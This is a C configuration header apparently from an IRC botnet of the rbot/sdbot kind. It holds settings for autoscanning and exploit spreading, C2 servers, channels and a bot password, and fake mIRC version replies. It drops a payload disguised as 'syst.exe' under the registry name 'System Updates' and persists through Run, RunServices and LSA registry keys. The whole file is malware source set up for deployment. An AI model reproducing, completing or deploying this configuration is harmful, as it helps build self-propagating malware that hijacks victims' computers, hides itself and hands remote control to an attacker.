// bot configuration (generic) - doesn't need to be encrypted
// random autoscan on statup config
#define AUIP "" //  example 218.220.x.x ip for autoscan on startup . leave it empty for default local scan .
#define sploit "ro0t1" 
int athread = 50; // thread for autoscan
int delay = 5; //delay for autoscan
int minutes = 0; // 0 minutes = for ever
BOOL arandom = FALSE; //
////////
int port = 57;				// server port
int port2 = 57;				// backup server port
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 80;			// Port # for http daemon to run on
int rloginport = 513;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = TRUE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '?';				// command prefix (one character max.)
int maxrand = 9;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = TRUE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="c:\\sys.ocx";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "fh";						// bot id
char version[] = "[Tg]";		// Bots !version reply
char password[] = "r";					// bot password
char server[] = "stiz"; // 
char serverpass[] = "";						// server password
char channel[] = "##";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "jufo";						// backup server (optional)
char channel2[] = "##";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "syst.exe";			// destination file name
char valuename[] = "System Updates";		// value name for autostart
char nickconst[] = "I|";					// first part to the bot's nick
char szLocalPayloadFile[]="msconfig.dat";	// Payload filename
char modeonconn[] = "-ix";					// Can be more than one mode and contain both + and -
char exploitchan[] = "##";					// Channel where exploit messages get redirected

char *authost[] = {
	"*@I.ov"
};

char *versionlist[] = {
	"mIRC v6.03 Khaled Mardam-Bey",
	"mIRC v6.10 Khaled Mardam-Bey",
	"mIRC v6.12 Khaled Mardam-Bey",
	"mIRC v6.14 Khaled Mardam-Bey"
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "pandasexw1th3xt4sy"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif

